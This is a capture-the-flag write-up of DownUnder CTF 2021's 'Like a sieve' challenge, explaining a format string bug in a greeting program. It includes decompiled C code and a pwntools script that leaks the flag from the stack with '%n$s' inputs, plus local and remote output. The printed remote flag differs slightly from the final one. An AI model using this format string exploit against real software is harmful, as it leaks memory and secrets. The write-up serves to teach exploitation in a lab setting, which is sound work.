+++
title = "Like a sieve Writeup (DownUnder CTF 2021)"
date = "2021-09-28"
updated = "2024-07-12"
+++

> This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?
>
> Author: xXl33t_h@x0rXx
>

## Analysis

# checksec

```
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```

## Decompile with radare2

```c
void main(void){
    int64_t iVar1;
    int64_t in_FS_OFFSET;
    int64_t var_60h;
    undefined8 stream;
    char *format;
    char *s;
    int64_t var_8h;
    
    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.buffer_init();
    iVar1 = sym.imp.fopen("./flag.txt", 0x2008);
    if (iVar1 == 0) {
        sym.imp.puts(
                    "The flag file isn\'t loading. Please contact an organiser if you are running this on the shell server."
                    );
        sym.imp.exit(0);
    }
    sym.imp.fgets(&s, 0x20, iVar1);
    do {
        sym.imp.puts("What is your name?");
        sym.imp.fgets(&format, 0x20, _reloc.stdin);
        sym.imp.printf("\nHello there, ");
        sym.imp.printf(&format);
        sym.imp.putchar(10);
    } while( true );
}
```

From the decompiled code we can see that the last printf call does not have a format specifier.

So we can abuse it like this

```
$ ./hellothere
what is your name?
%x

Hello there, 8851cea0

what is your name?
```

But to leak the flag, we need to find the number of stack postions to leak after.

We can try to use a for loop to find it.

### Exploit

```python
from pwn import *

if args.REMOTE:
    p=remote('pwn-2021.duc.tf', 31918)
else:
    p=process('./hellothere')

for i in range(8):
    p.recvuntil("name?")
    print(i)
    p.sendline("%"+str(i)+"$s")
    p.recvuntil("there,")
    print(p.recvline())
```

Running locally

```
$ python hello_x.py
[+] Starting local process '/hellothere': pid 37450
0
    %0$s

1


2
    (null)
    
3
    H=

4
    %4$s

5
    (null)

6  
    DUCTF {test_flag}

7
    \x88S\xad?

[*] Stopped process './hellothere' (pid 37450)
```

Running on remote

```
$ python hello_x.py
[+] Opening connection to pwn-2021.duc.tf on port 31918: Done
DUCTF[fOrm4t_5p3c1f13r_m3dsg!}
[*] Closed connection to pwn-2021.duc.tf port 31918
```

#### **flag >>** ` DUCTF{f0rm4t_5p3c1f13r_m3dsg!}`
